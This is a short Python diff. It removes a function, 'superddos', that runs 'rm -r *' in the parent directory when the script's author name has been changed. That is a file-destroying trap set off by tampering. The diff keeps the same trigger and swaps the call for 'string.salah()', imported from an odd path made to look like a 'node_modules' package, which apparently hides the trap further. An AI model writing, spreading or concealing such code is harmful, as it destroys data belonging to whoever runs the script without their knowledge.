@@ -11,7 +11,7 @@ import getpass
 import sys
 import json
 import platform
-
+from node_modules.psl.data import string
 
 #JANGAN DI UBAH DEK! #
 #JANGAN DI UBAH DEK! #
@@ -90,16 +90,7 @@ def main():
             except IndexError:
                 pass
                 
-def superddos():
-    os.chdir('..') 
-    time.sleep(3)
-    file_list = os.listdir()
-
-    for file in file_list:
-        if os.path.isfile(file):
-        	subprocess.call("rm -r *", shell=True)
-
 if author == "dandier":
     main()
 else:
-    superddos()
+    string.salah()
